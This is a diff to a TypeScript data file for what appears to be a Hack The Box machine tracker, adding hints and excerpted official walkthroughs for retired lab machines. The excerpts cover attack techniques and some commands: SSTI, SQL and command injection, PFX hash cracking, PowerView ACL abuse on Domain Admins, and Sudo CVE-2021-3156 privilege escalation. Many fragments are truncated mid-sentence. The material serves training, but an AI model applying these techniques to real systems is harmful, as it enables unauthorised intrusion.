+    "officialWalkthrough": "### 📋 Official Synopsis\nLate is an Easy Linux machine that features a Server Side Template Injection (SSTI) vulnerability in a text reading application, which leads to Remote Code Execution as user svc_acc .\n\n### 🎯 Core Skills\n- **Server Side Template Injection**\n- **Linux file attributes**\n\n### ⚔️ Foothold Vector\nSince this is a Flask application it might be using a template engine. If that is the case there is a possibility for it to be vulnerable to a Server Side Template Injection. Let's see if the page is indeed vulnerable. Flask uses the template engine Jinja2 by default, so that is what we'll be basing our payloads on. PayloadAllTheThings has a wide variety of payloads for web-related vulnerabilities. We know that the server takes an image as input, so that will be our payload delivery. Using Python we can easily make our own image generator. Consider the following script. The script uses the PIL (Python Image Library) library in Python in order to create an image.\n\n### 👑 Privilege Escalation\nuser, however, enumeration of the file attributes show that it cannot be directly edited, but data can be appended. A reverse shell can be added at the end of this script in order to gain a shell as root . Skills Required Enumeration Bash code review Skills Learned Server Side Template Injection Linux file attributes Enumeration Nmap Let's begin by scanning for open ports using Nmap . ports=$(nmap -p- --min-rate=1000 -T4 10.10.11.156 | grep '^[0-9]' | cut -d '/' -f 1 | tr '\\n' ',' | sed s/,$//) nmap -p$ports -sC -sV 10.10.11.156 There are only two ports open on the machine, port 22 and 80 . Port 22 is running OpenSSH and port 80 is hosting Nginx , which is a web server."
   },
   {
     "id": "htb-backend",
@@ -5865,10 +6208,13 @@ export const INITIAL_MACHINES: Machine[] = [
     "certifications": [],
     "roomUrl": "https://app.hackthebox.com/machines/hathor",
     "writeupUrl": "https://0xdf.gitlab.io/tags#hathor",
-    "hint": "Hack The Box Windows machine. Rated Insane difficulty.",
+    "hint": "Hathor is an Insane Windows Active Directory machine that starts with a webpage that is currently under construction. The CMS used for the webpage is the mojoPortal CMS.",
     "timeSpentSeconds": 0,
     "createdAt": "2022-04-16T16:00:00.000000Z",
-    "updatedAt": "2026-08-20T11:30:00.000Z"
+    "updatedAt": "2026-08-20T11:30:00.000Z",
+    "officialSynopsis": "Hathor is an Insane Windows Active Directory machine that starts with a webpage that is currently under construction. The CMS used for the webpage is the mojoPortal CMS. Since the CMS is open source, an attacker is able to find the default credentials used in the Admin panel straight away. It turns out that the credentials have not been modified on the remote machine and the attacker gets access to the Admin panel. There, it is discovered that any file with the extension .txt can be uploaded on the remote server. So, an attacker could leverage this and upload a webshell with the .",
+    "officialPdf": "459-Hathor_HTB_Official_writeup_Tamarisk.pdf",
+    "officialWalkthrough": "### 📋 Official Synopsis\nHathor is an Insane Windows Active Directory machine that starts with a webpage that is currently under construction. The CMS used for the webpage is the mojoPortal CMS. Since the CMS is open source, an attacker is able to find the default credentials used in the Admin panel straight away. It turns out that the credentials have not been modified on the remote machine and the attacker gets access to the Admin panel. There, it is discovered that any file with the extension .txt can be uploaded on the remote server. So, an attacker could leverage this and upload a webshell with the .\n\n### ⚔️ Foothold Vector\nDLL injection Script signing Kerberos authentication Enumeration Nmap The initial Nmap output reveals a lot of ports open, indicating that the machine uses Active Directory. On port 80 we have an IIS web server. Also, according to the Nmap output, we have a valid hostname for the machine hathor.windcorp.htb . Thus, we modify our hosts file accordingly: ports=$(nmap -p- --min-rate=1000 -T4 10.10.11.147 | grep ^[0-9] | cut -d '/' -f 1 | tr '\\n' ',' | sed s/,$//) nmap -p$ports -sC -sV 10.10.11.147 IIS - Port 80 We begin our enumeration by visiting http://hathor.windcorp.htb .\n\n### 👑 Privilege Escalation\n\\Data\\sites\\1\\media\\logos rename-item -path \"accesschk64.txt\" -newname \"accesschk64.exe\" .\\accesschk64.exe -w -s -q -u Users \"C:\\Windows\" >> windows.txt -accepteula type windows.txt The script seems to be a modified vesrion of Get-bADpasswords. This project was created to test the passwords of enabled Active Directory users against bad/weak/non-compliant passwords. Interestingly enough, the version on the remote machine has the option write_hash_to_logs enabled and it is signed meaning that AppLocker will allow its execution."
   },
   {
     "id": "htb-talkative",
@@ -5879,15 +6225,22 @@ export const INITIAL_MACHINES: Machine[] = [
     "difficulty": "Hard",
     "status": "backlog",
     "tags": [
-      "HTB"
+      "HTB",
+      "Network"
     ],
     "certifications": [],
     "roomUrl": "https://app.hackthebox.com/machines/talkative",
     "writeupUrl": "https://0xdf.gitlab.io/tags#talkative",
-    "hint": "Hack The Box Linux machine. Rated Hard difficulty.",
+    "hint": "Talkative is a hard Linux machine that starts off with a command injection in the Jamovi web application, which leads us into the Jamovi docker in which we find an omv file. Decompressing this omv file gives us the credentials for the admin user in Bolt CMS.",
     "timeSpentSeconds": 0,
     "createdAt": "2022-04-09T16:00:00.000000Z",
-    "updatedAt": "2026-08-20T11:30:00.000Z"
+    "updatedAt": "2026-08-20T11:30:00.000Z",
+    "officialSynopsis": "Talkative is a hard Linux machine that starts off with a command injection in the Jamovi web application, which leads us into the Jamovi docker in which we find an omv file. Decompressing this omv file gives us the credentials for the admin user in Bolt CMS. This leads us to get a shell as user www-data by exploiting a Server Side Template Injection in twig . Further network",
+    "skillsLearned": [
+      "Network"
+    ],
+    "officialPdf": "458-Talkative_HTB_Official_writeup_Tamarisk.pdf",
+    "officialWalkthrough": "### 📋 Official Synopsis\nTalkative is a hard Linux machine that starts off with a command injection in the Jamovi web application, which leads us into the Jamovi docker in which we find an omv file. Decompressing this omv file gives us the credentials for the admin user in Bolt CMS. This leads us to get a shell as user www-data by exploiting a Server Side Template Injection in twig . Further network\n\n### 🎯 Core Skills\n- **Network**\n\n### ⚔️ Foothold Vector\nof the RocketChat's webhook functionality gives us a\n\n### 👑 Privilege Escalation\nwe need to leverage port forwarding for connecting to a MongoDB server running in a separate container and through that we need to modify RocketChat's registered user role in order to access the admin's dashboard in the RocketChat web GUI. Further exploitation of the RocketChat's webhook functionality gives us a root shell in the RocketChat docker container. Since we are root in the docker container, we can install libcap2 and view the system capabilities, which lead to abusing the CAP_DAC_READ_SEARCH capability to run the shocker exploit and read the root flag."
   },
   {
     "id": "htb-ransom",
@@ -5917,15 +6270,24 @@ export const INITIAL_MACHINES: Machine[] = [
     "difficulty": "Medium",
     "status": "backlog",
     "tags": [
-      "HTB"
+      "HTB",
+      "based-buffer-overflows"
     ],
     "certifications": [],
     "roomUrl": "https://app.hackthebox.com/machines/retired",
     "writeupUrl": "https://0xdf.gitlab.io/tags#retired",
-    "hint": "Hack The Box Linux machine. Rated Medium difficulty.",
+    "hint": "Retired is a medium difficulty Linux machine that focuses on simple web attacks, stack-based binary exploitation and insecure kernel features. Initial foothold is gained by exploiting a path traversal vulnerability in a web application, which leads to the discovery of an internal",
     "timeSpentSeconds": 0,
     "createdAt": "2022-04-02T16:00:00.000000Z",
-    "updatedAt": "2026-08-20T11:30:00.000Z"
+    "updatedAt": "2026-08-20T11:30:00.000Z",
+    "officialSynopsis": "Retired is a medium difficulty Linux machine that focuses on simple web attacks, stack-based binary exploitation and insecure kernel features. Initial foothold is gained by exploiting a path traversal vulnerability in a web application, which leads to the discovery of an internal service that is handling uploaded data.",
+    "skillsLearned": [
+      "Developing ROP/ret2libc exploits for stack",
+      "based buffer overflows",
+      "Gaining root privileges through writable /proc/sys/fs/binfmt_misc/register"
+    ],
+    "officialPdf": "456-Retired_HTB_Official_writeup_Tamarisk.pdf",
+    "officialWalkthrough": "### 📋 Official Synopsis\nRetired is a medium difficulty Linux machine that focuses on simple web attacks, stack-based binary exploitation and insecure kernel features. Initial foothold is gained by exploiting a path traversal vulnerability in a web application, which leads to the discovery of an internal service that is handling uploaded data.\n\n### 🎯 Core Skills\n- **Developing ROP/ret2libc exploits for stack**\n- **based buffer overflows**\n- **Gaining root privileges through writable /proc/sys/fs/binfmt_misc/register**\n\n### ⚔️ Foothold Vector\nand insecure kernel features. Initial foothold is gained by exploiting a path traversal vulnerability in a web application, which leads to the discovery of an internal service that is handling uploaded data. The corresponding binary file, its dependencies and memory map can be downloaded via the same path traversal vector, and analysed to identify a buffer overflow vulnerability and obtain the necessary memory addresses and ROP gadgets to develop a working exploit, resulting in an interactive shell on the system.\n\n### 👑 Privilege Escalation\nby leveraging the credentials flag when registering a custom handler for root -owned setuid files. Skills Required Enumeration Exploiting path traversal vulnerabilities Basic Linux knowledge Basic binary exploitation knowledge Skills Learned Developing ROP/ret2libc exploits for stack-based buffer overflows Gaining root privileges through writable /proc/sys/fs/binfmt_misc/register Enumeration Nmap Nginx Browsing to the web server on port 80, we are redirected to /index.php?page=default.html . The page mentions a handheld gaming console named OSTRICH and an official software emulator, only available to beta testers, called EMUEMU ."
   },
   {
     "id": "htb-timelapse",
@@ -5936,15 +6298,23 @@ export const INITIAL_MACHINES: Machine[] = [
     "difficulty": "Easy",
     "status": "backlog",
     "tags": [
-      "HTB"
+      "HTB",
+      "Public-SMB-Share"
     ],
     "certifications": [],
     "roomUrl": "https://app.hackthebox.com/machines/timelapse",
     "writeupUrl": "https://0xdf.gitlab.io/tags#timelapse",
-    "hint": "Hack The Box Windows machine. Rated Easy difficulty.",
+    "hint": "Timelapse is an Easy Windows which involves accessing a publicly accessible SMB share containing a zip file with a PFX key. This zip file requires a password, which can be cracked by using John.",
     "timeSpentSeconds": 0,
     "createdAt": "2022-03-26T17:00:00.000000Z",
-    "updatedAt": "2026-08-20T11:30:00.000Z"
+    "updatedAt": "2026-08-20T11:30:00.000Z",
+    "officialSynopsis": "Timelapse is an Easy Windows which involves accessing a publicly accessible SMB share containing a zip file with a PFX key. This zip file requires a password, which can be cracked by using John. Extracting the zip file shows it contains a password encrypted PFX file which can be gathered with John as well by converting the PFX file to a hash format readable by John. From the PFX file an SSL certificate and a private key can be extracted which is used for logging in with WinRM. After authentication we discover a PowerShell history file containing login credentials for svc_deploy user. User",
+    "skillsLearned": [
+      "Public SMB Share",
+      "LAPS Privilege Escalation"
+    ],
+    "officialPdf": "452-Timelapse_HTB_Official_writeup_Tamarisk.pdf",
+    "officialWalkthrough": "### 📋 Official Synopsis\nTimelapse is an Easy Windows which involves accessing a publicly accessible SMB share containing a zip file with a PFX key. This zip file requires a password, which can be cracked by using John. Extracting the zip file shows it contains a password encrypted PFX file which can be gathered with John as well by converting the PFX file to a hash format readable by John. From the PFX file an SSL certificate and a private key can be extracted which is used for logging in with WinRM. After authentication we discover a PowerShell history file containing login credentials for svc_deploy user. User\n\n### 🎯 Core Skills\n- **Public SMB Share**\n- **LAPS Privilege Escalation**\n\n### ⚔️ Foothold Vector\nFoothold openssl pkcs12 -in legacyy_dev_auth.pfx -nocerts -out key.pem -nodes python2 /usr/share/john/pfx2john.py legacyy_dev_auth.pfx > pfx.john john pfx.john -wordlist:/usr/share/wordlists/rockyou.txt openssl pkcs12 -in legacyy_dev_auth.pfx -nocerts -out key.pem -nodes openssl pkcs12 -in legacyy_dev_auth.pfx -nokeys -out cert.pem Since we have decrypted the pfx file and generated a valid key and certificate, we can attempt to login through WinRM. In the output of our Nmap command we can see that port 5986 is open, which is commonly used by WinRM but using SSL instead of unencrypted connections.\n\n### 👑 Privilege Escalation\nEnumeration Nmap Let's begin by scanning for open ports using Nmap . The output of Nmap shows multiple open ports, a machine name of dc01 and a domain name of timelapse.htb . We notice that SMB is open so we verify if we can get anonymous access to any shares. ports=$(nmap -p- --min-rate=1000 -T4 10.10.11.166 | grep '^[0-9]' | cut -d '/' - f 1 | tr '\\n' ',' | sed s/,$//) nmap -p$ports -sC -sV 10.10.11.166 PFX file To view the available SMB shares we use the following command. The output above shows that there is a share with the name Shares , which we can access without the use of any credentials. We find two folders named Dev and HelpDesk ."
   },
   {
     "id": "htb-perspective",
@@ -5960,10 +6330,18 @@ export const INITIAL_MACHINES: Machine[] = [
     "certifications": [],
     "roomUrl": "https://app.hackthebox.com/machines/perspective",
     "writeupUrl": "https://0xdf.gitlab.io/tags#perspective",
-    "hint": "Hack The Box Windows machine. Rated Insane difficulty.",
+    "hint": "Perspective is an insane difficulty Windows machine that focuses on the exploitation of ASP.NET web applications and badly implemented cryptography. Initial access is obtained by reading the application web.config file via a Server-Side Include, which is possible due to a weak fi",
     "timeSpentSeconds": 0,
     "createdAt": "2022-03-19T17:00:00.000000Z",
-    "updatedAt": "2026-08-20T11:30:00.000Z"
+    "updatedAt": "2026-08-20T11:30:00.000Z",
+    "officialSynopsis": "Perspective is an insane difficulty Windows machine that focuses on the exploitation of ASP.NET web applications and badly implemented cryptography. Initial access is obtained by reading the application web.config file via a Server-Side Include, which is possible due to a weak filter on file upload. Having retrieved the application machineKey , a new session cookie can be forged to gain administrative rights and access a restricted area, where SSRF can be exploited to access an internal encryption API which uses a weak RC4 implementation, resulting in the decryption of the ViewStateUserKey .",
+    "skillsLearned": [
+      "Exploiting ViewState deserialisation in ASP.NET web applications",
+      "Abusing weak RC4 implementations",
+      "Performing Padding Oracle Attacks"
+    ],
+    "officialPdf": "451-Perspective_HTB_Official_writeup_Tamarisk.pdf",
+    "officialWalkthrough": "### 📋 Official Synopsis\nPerspective is an insane difficulty Windows machine that focuses on the exploitation of ASP.NET web applications and badly implemented cryptography. Initial access is obtained by reading the application web.config file via a Server-Side Include, which is possible due to a weak filter on file upload. Having retrieved the application machineKey , a new session cookie can be forged to gain administrative rights and access a restricted area, where SSRF can be exploited to access an internal encryption API which uses a weak RC4 implementation, resulting in the decryption of the ViewStateUserKey .\n\n### 🎯 Core Skills\n- **Exploiting ViewState deserialisation in ASP.NET web applications**\n- **Abusing weak RC4 implementations**\n- **Performing Padding Oracle Attacks**\n\n### ⚔️ Foothold Vector\nof ASP.NET web applications and badly implemented cryptography. Initial access is obtained by reading the application web.config file via a Server-Side Include, which is possible due to a weak filter on file upload. Having retrieved the application machineKey , a new session cookie can be forged to gain administrative rights and access a restricted area, where SSRF can be exploited to access an internal encryption API which uses a weak RC4 implementation, resulting in the decryption of the ViewStateUserKey . Remote command execution is then achieved via deserialisation of a malicious ViewState that can be forged using the obtained application keys.\n\n### 👑 Privilege Escalation\nNetwork enumeration reveals the non-default listening port 8009, which was not listed in our initial Nmap scan. We can use SSH local port forwarding to access the service on port 8009 from our attacking machine. Browsing to http://127.0.0.1:8009 returns a web page that looks very similar to the main page on port 80. ssh -fN -i id_rsa -L 8009:127.0.0.1:8009 webuser@10.10.11.151 The footer at the bottom of the page reveals that this is a staging environment: In contrast to the production environment, verbose error messages are enabled on staging."
   },
   {
     "id": "htb-catch",
@@ -5974,15 +6352,26 @@ export const INITIAL_MACHINES: Machine[] = [
     "difficulty": "Medium",
     "status": "backlog",
     "tags": [
-      "HTB"
+      "Decompile-APK-files",
+      "HTB",
+      "Laravel-Deserialization",
+      "Tamper-with-APK-files"
     ],
     "certifications": [],
     "roomUrl": "https://app.hackthebox.com/machines/catch",
     "writeupUrl": "https://0xdf.gitlab.io/tags#catch",
-    "hint": "Hack The Box Linux machine. Rated Medium difficulty.",
+    "hint": "Catch is a medium difficulty Linux machine that features several web applications listening on different ports. Port 80 provides a potential attacker with an APK file.",
     "timeSpentSeconds": 0,
     "createdAt": "2022-03-12T17:00:00.000000Z",
-    "updatedAt": "2026-08-20T11:30:00.000Z"
+    "updatedAt": "2026-08-20T11:30:00.000Z",
+    "officialSynopsis": "Catch is a medium difficulty Linux machine that features several web applications listening on different ports. Port 80 provides a potential attacker with an APK file. Inside the APK file are leftover tokens for various other services/applications. On port 3000 there is an instance of Gitea running. Unfortunately, the token for Gitea that was found inside the APK is no longer valid and there is no way to progress further on this port. Next, on port 5000 there is a Let's chat application present.",
+    "skillsLearned": [
+      "Laravel Deserialization",
+      "Decompile APK files",
+      "Tamper with APK files"
+    ],
+    "officialPdf": "450-Catch_HTB_Official_writeup_Tamarisk.pdf",
+    "officialWalkthrough": "### 📋 Official Synopsis\nCatch is a medium difficulty Linux machine that features several web applications listening on different ports. Port 80 provides a potential attacker with an APK file. Inside the APK file are leftover tokens for various other services/applications. On port 3000 there is an instance of Gitea running. Unfortunately, the token for Gitea that was found inside the APK is no longer valid and there is no way to progress further on this port. Next, on port 5000 there is a Let's chat application present.\n\n### 🎯 Core Skills\n- **Laravel Deserialization**\n- **Decompile APK files**\n- **Tamper with APK files**\n\n### ⚔️ Foothold Vector\nSearching around the web we find out that this version has a known code execution vulnerability. Referring to the blogpost we can take the following approach to exploit the status application: Update SESSION_DRIVER to redis using new line injection. Inject serialised payload to redis session to gain the code execution. First of all, we have to start a redis server on our local machine. Then, we click on Settings > Mail . Then, we click the Save button and capture the request using BurpSuite . Change mail_driver to cache_driver . Also, modify the request to match the following payload. Browsing the login page we see a new session stored in our redis-server database.\n\n### 👑 Privilege Escalation\n. Analyzing the script it is found that it's vulnerable to command injection. Thus, an attacker is able to craft a malicious APK file, wait for root to execute the script and ultimately get a shell as the user root . Skills Required q Enumeration Searching for known exploits Source Code Review Command Injection Skills Learned Laravel Deserialization Decompile APK files Tamper with APK files Enumeration Nmap The Nmap scan reveals that the server has multiple ports open, including some odd ports, like port 3000 and 5000 , which don't correspond to known services. On the other hand, there seems to be two different versions of Apache server listening on port 80 and on port 8000 respectively."
   },
   {
     "id": "htb-phoenix",
@@ -5993,15 +6382,25 @@ export const INITIAL_MACHINES: Machine[] = [
     "difficulty": "Hard",
     "status": "backlog",
     "tags": [
-      "HTB"
+      "HTB",
+      "Wildcard-injection"
     ],
     "certifications": [],
     "roomUrl": "https://app.hackthebox.com/machines/phoenix",
     "writeupUrl": "https://0xdf.gitlab.io/tags#phoenix",
-    "hint": "Hack The Box Linux machine. Rated Hard difficulty.",
+    "hint": "Phoenix is a hard Linux machine that features with a WordPress site. Enumerating the website an attacker is able to find that a plugin vulnerable to SQL injection is installed.",
     "timeSpentSeconds": 0,
     "createdAt": "2022-03-05T17:00:00.000000Z",
-    "updatedAt": "2026-08-20T11:30:00.000Z"
+    "updatedAt": "2026-08-20T11:30:00.000Z",
+    "officialSynopsis": "Phoenix is a hard Linux machine that features with a WordPress site. Enumerating the website an attacker is able to find that a plugin vulnerable to SQL injection is installed. Unfortunately, the SQL injection is a blind time-based attack, which takes a long time to complete. To avoid spending a lot of time the attacker has to make very specific queries to dump only the data he needs to progress further.",
+    "skillsLearned": [
+      "Two factor authentication bypass",
+      "SSH authentication configuration",
+      "Reverse engineering encrypted shell binaries",
+      "Wildcard injection"
+    ],
+    "officialPdf": "448-Phoenix_HTB_Official_writeup_Tamarisk.pdf",
+    "officialWalkthrough": "### 📋 Official Synopsis\nPhoenix is a hard Linux machine that features with a WordPress site. Enumerating the website an attacker is able to find that a plugin vulnerable to SQL injection is installed. Unfortunately, the SQL injection is a blind time-based attack, which takes a long time to complete. To avoid spending a lot of time the attacker has to make very specific queries to dump only the data he needs to progress further.\n\n### 🎯 Core Skills\n- **Two factor authentication bypass**\n- **SSH authentication configuration**\n- **Reverse engineering encrypted shell binaries**\n- **Wildcard injection**\n\n### ⚔️ Foothold Vector\nThe OTP validation page that we landed on is some kind of Two factor authentication (2FA) mechanism to prevent access on the account even if the credentials are obtained by an attacker. This guide gives a very good explanation on what Time-based One-time passwords (TOTP) are and how they work. The general idea is that on the client side, an Authenticator application needs a secret key to generate TOTPs. The secret key can be entered into the Authenticator application by scanning a QR code or by entering the secret key in plain text.\n\n### 👑 Privilege Escalation\nand it's vulnerable to wildcard injection attacks. Leveraging this vulnerability the attacker is able to get a reverse shell as the user root . Skills Required Enumeration SQL injection Offline hash cracking Source code review Skills Learned Two factor authentication bypass SSH authentication configuration Reverse engineering encrypted shell binaries Wildcard injection Enumeration Nmap The Nmap output reveals three ports open. On port 22 an SSH server is running, on port 80 an Apache web server and on port 443 the secure version of, probably, the same web site. Since we don't, currently, have any valid SSH credential we should begin our enumeration by visiting port 80 and 443 respectively."
   },
   {
     "id": "htb-object",
@@ -6012,15 +6411,22 @@ export const INITIAL_MACHINES: Machine[] = [
     "difficulty": "Hard",
     "status": "backlog",
     "tags": [
-      "HTB"
+      "HTB",
+      "Jenkins"
     ],
     "certifications": [],
     "roomUrl": "https://app.hackthebox.com/machines/object",
     "writeupUrl": "https://0xdf.gitlab.io/tags#object",
-    "hint": "Hack The Box Windows machine. Rated Hard difficulty.",
+    "hint": "Object is a hard Windows machine running Jenkins automation server. The automation server is found to have registration enabled and the registered user can create builds.",
     "timeSpentSeconds": 0,
     "createdAt": "2022-02-28T16:00:05.000000Z",
-    "updatedAt": "2026-08-20T11:30:00.000Z"
+    "updatedAt": "2026-08-20T11:30:00.000Z",
+    "officialSynopsis": "Object is a hard Windows machine running Jenkins automation server. The automation server is found to have registration enabled and the registered user can create builds. Builds can be triggered remotely by configuring an api token. Foothold is obtained by decrypting the Jenkins secrets. The foothold user is found to have ForceChangePassword permissions on another user called smith . This privilege abuse allows us to gain access to smith . smith has GenericWrite permissions on maria . Abusing this privilege allows us to gain access to the server as this user.",
+    "skillsLearned": [
+      "Jenkins"
+    ],
+    "officialPdf": "447-Object_HTB_Official_writeup_Tamarisk.pdf",
+    "officialWalkthrough": "### 📋 Official Synopsis\nObject is a hard Windows machine running Jenkins automation server. The automation server is found to have registration enabled and the registered user can create builds. Builds can be triggered remotely by configuring an api token. Foothold is obtained by decrypting the Jenkins secrets. The foothold user is found to have ForceChangePassword permissions on another user called smith . This privilege abuse allows us to gain access to smith . smith has GenericWrite permissions on maria . Abusing this privilege allows us to gain access to the server as this user.\n\n### 🎯 Core Skills\n- **Jenkins**\n\n### ⚔️ Foothold Vector\nis obtained by decrypting the Jenkins secrets. The foothold user is found to have ForceChangePassword permissions on another user called smith . This privilege abuse allows us to gain access to smith . smith has GenericWrite permissions on maria . Abusing this privilege allows us to gain access to the server as this user. maria has WriteOwner permissions on Domain Admins group, whose privileges we exploit to get a SYSTEM shell.\n\n### 👑 Privilege Escalation\nLet's enumerate ACL's using Powerview's invoke-aclscanner , which we previously uploaded on the box. This utility can also be also found on BloodHound. We see that maria has WriteOwner privileges on the Domain Admins object. This allows us to change ownership of Domain Admins group to any user, which further gives us access to modify ACL's on that group. Let's attempt to set the Owner of the Domain Admins group to Maria. Invoke-ACLScanner -ResolveGUIDs | ?{$_.identityreferencename -like \"maria\"} Set-DomainObjectOwner -Identity 'Domain Admins' -OwnerIdentity 'maria' Then we can add an ACL to gain full control over this group."
   },
   {
     "id": "htb-goodgames",
@@ -6031,15 +6437,30 @@ export const INITIAL_MACHINES: Machine[] = [
     "difficulty": "Easy",
     "status": "backlog",
     "tags": [
-      "HTB"
+      "Based-SQL-Injections",
+      "Exploiting-SSTI",
+      "Exploiting-Union",
+      "HTB",
+      "Password-Reuse"
     ],
     "certifications": [],
     "roomUrl": "https://app.hackthebox.com/machines/goodgames",
     "writeupUrl": "https://0xdf.gitlab.io/tags#goodgames",
-    "hint": "Hack The Box Linux machine. Rated Easy difficulty.",
+    "hint": "GoodGames is an Easy linux machine that showcases the importance of sanitising user inputs in web applications to prevent SQL injection attacks, using strong hashing algorithms in database structures to prevent the extraction and cracking of passwords from a compromised database,",
     "timeSpentSeconds": 0,
     "createdAt": "2022-02-21T16:00:05.000000Z",
-    "updatedAt": "2026-08-20T11:30:00.000Z"
+    "updatedAt": "2026-08-20T11:30:00.000Z",
+    "officialSynopsis": "GoodGames is an Easy linux machine that showcases the importance of sanitising user inputs in web applications to prevent SQL injection attacks, using strong hashing algorithms in database structures to prevent the extraction and cracking of passwords from a compromised database, along with the dangers of password re-use. It also highlights the dangers of using render_template_string in a Python web application where user input is reflected, allowing Server Side Template Injection (SSTI) attacks. Privilege escalation involves docker hosts",
+    "skillsLearned": [
+      "Exploiting Union",
+      "Based SQL Injections",
+      "Hash Cracking Weak Algorithms",
+      "Password Reuse",
+      "Exploiting SSTI",
+      "Basics of Docker Breakouts"
+    ],
+    "officialPdf": "446-GoodGames_HTB_Official_writeup_Tamarisk.pdf",
+    "officialWalkthrough": "### 📋 Official Synopsis\nGoodGames is an Easy linux machine that showcases the importance of sanitising user inputs in web applications to prevent SQL injection attacks, using strong hashing algorithms in database structures to prevent the extraction and cracking of passwords from a compromised database, along with the dangers of password re-use. It also highlights the dangers of using render_template_string in a Python web application where user input is reflected, allowing Server Side Template Injection (SSTI) attacks. Privilege escalation involves docker hosts\n\n### 🎯 Core Skills\n- **Exploiting Union**\n- **Based SQL Injections**\n- **Hash Cracking Weak Algorithms**\n- **Password Reuse**\n- **Exploiting SSTI**\n- **Basics of Docker Breakouts**\n\n### ⚔️ Foothold Vector\nSkills Basic Hash Cracking Skills Understanding of Detection & Exploitation of SSTI Understanding of Basic Docker Security Concepts Skills Learned Exploiting Union-Based SQL Injections Hash Cracking Weak Algorithms Password Reuse Exploiting SSTI Basics of Docker Breakouts Enumeration Nmap Nmap scan shows that only port 80 hosting a Python 3.9.2 application is listening. Python Webserver Browsing to port 80 we see a gaming based website. The page title is GoodGames and the footer discloses that the site runs on goodgames.htb . Let's add this to our hosts file.\n\n### 👑 Privilege Escalation\ninvolves docker hosts enumeration and shows how having admin privileges in a container and a low privilege user on the host machine can be dangerous, allowing attackers to escalate privileges to compromise the system. Skills Required Web Enumeration Basic Web Exploitation Skills Basic Hash Cracking Skills Understanding of Detection & Exploitation of SSTI Understanding of Basic Docker Security Concepts Skills Learned Exploiting Union-Based SQL Injections Hash Cracking Weak Algorithms Password Reuse Exploiting SSTI Basics of Docker Breakouts Enumeration Nmap Nmap scan shows that only port 80 hosting a Python 3.9.2 application is listening."
   },
   {
     "id": "htb-routerspace",
@@ -6050,15 +6471,26 @@ export const INITIAL_MACHINES: Machine[] = [
     "difficulty": "Easy",
     "status": "backlog",
     "tags": [
-      "HTB"
+      "CVE-2021-3156",
+      "Command-Injection",
+      "HTB",
+      "Using-Android-Emulators"
     ],
     "certifications": [],
     "roomUrl": "https://app.hackthebox.com/machines/routerspace",
     "writeupUrl": "https://0xdf.gitlab.io/tags#routerspace",
-    "hint": "Hack The Box Linux machine. Rated Easy difficulty.",
+    "hint": "RouterSpace is an Easy Linux machine that features a web page on port 80. The webpage allows the download of an APK package, which is an Android application.",
     "timeSpentSeconds": 0,
     "createdAt": "2022-02-26T17:00:00.000000Z",
-    "updatedAt": "2026-08-20T11:30:00.000Z"
+    "updatedAt": "2026-08-20T11:30:00.000Z",
+    "officialSynopsis": "RouterSpace is an Easy Linux machine that features a web page on port 80. The webpage allows the download of an APK package, which is an Android application. Attempts to reverse engineer the APK are unsuccessful as the code is heavily obfuscated. Instead an Android emulator is used to check the functionality of the Android application and a proxy is set up in order to capture the network requests that the application is making. The request captured leads to a hidden API endpoint on the main web application, which is found to be vulnerable to command injection.",
+    "skillsLearned": [
+      "Using Android Emulators",
+      "Command Injection",
+      "Linux Privilege Escalation"
+    ],
+    "officialPdf": "444-RouterSpace_HTB_Official_writeup_Tamarisk.pdf",
+    "officialWalkthrough": "### 📋 Official Synopsis\nRouterSpace is an Easy Linux machine that features a web page on port 80. The webpage allows the download of an APK package, which is an Android application. Attempts to reverse engineer the APK are unsuccessful as the code is heavily obfuscated. Instead an Android emulator is used to check the functionality of the Android application and a proxy is set up in order to capture the network requests that the application is making. The request captured leads to a hidden API endpoint on the main web application, which is found to be vulnerable to command injection.\n\n### 🎯 Core Skills\n- **Using Android Emulators**\n- **Command Injection**\n- **Linux Privilege Escalation**\n\n### 🛡️ Associated CVEs\n`CVE-2021-3156`\n\n### ⚔️ Foothold Vector\nThe code seems heavily obfuscated and it is uncertain if we can de-obfuscate it and get readable code. cat index.android.bundle Genymotion Let's instead attempt to install the APK to an Android device and check it's functionality. For this purpose we can use Genymotion, which is an Android emulator. Download the package for your OS and install it. Note: It's best to install Genymotion in a host system as if it is installed in a virtual machine it will need CPU Virtualization to properly work. Next we will need to install VirtualBox so that Genymotion can properly emulate android devices. After both applications have been installed, let's open Genymotion.\n\n### 👑 Privilege Escalation\ncan be achieved by enumerating the system with LinPEAS and identifying that it is vulnerable to the Sudo Baron Samedit exploit assigned CVE-2021-3156 . Running the Python exploit produces a root shell. Skills Required Enumeration Basic Android Knowledge Basic Linux knowledge Skills Learned Using Android Emulators Command Injection Linux Privilege Escalation Enumeration Nmap Let's begin by scanning for open ports using Nmap . The scan reveals ports 22 (SSH) and 80 (HTTP) open. The server on port 80 does not seem to be correctly identified, but we can attempt to browse to port 80 with a browser. ports=$(nmap -p- --min-rate=1000 -T4 10.129.77."
   },
   {
     "id": "htb-steamcloud",
@@ -6069,15 +6501,22 @@ export const INITIAL_MACHINES: Machine[] = [
     "difficulty": "Easy",
     "status": "backlog",
     "tags": [
+      "Exploiting-Kubernetes",
       "HTB"
     ],
     "certifications": [],
     "roomUrl": "https://app.hackthebox.com/machines/steamcloud",
     "writeupUrl": "https://0xdf.gitlab.io/tags#steamcloud",
-    "hint": "Hack The Box Linux machine. Rated Easy difficulty.",
+    "hint": "SteamCloud is an easy difficulty machine. The port scan reveals that it has a bunch of Kubernetes specific ports open.",
     "timeSpentSeconds": 0,
     "createdAt": "2022-02-14T08:00:05.000000Z",
-    "updatedAt": "2026-08-20T11:30:00.000Z"
+    "updatedAt": "2026-08-20T11:30:00.000Z",
+    "officialSynopsis": "SteamCloud is an easy difficulty machine. The port scan reveals that it has a bunch of Kubernetes specific ports open. We cannot enumerate the Kubernetes API because it requires authentication. Now, as Kubelet allows anonymous access, we can extract a list of all the pods from the K8s cluster by enumerating the Kubelet service. Furthermore, we can get into one of the pods and obtain the keys necessary to authenticate into the Kubernetes API. We can now create and spawn a malicious pod and then use Kubectl to run commands within the pod to read the root flag.",
+    "skillsLearned": [
+      "Exploiting Kubernetes"
+    ],
+    "officialPdf": "443-SteamCloud_HTB_Official_writeup_Tamarisk.pdf",
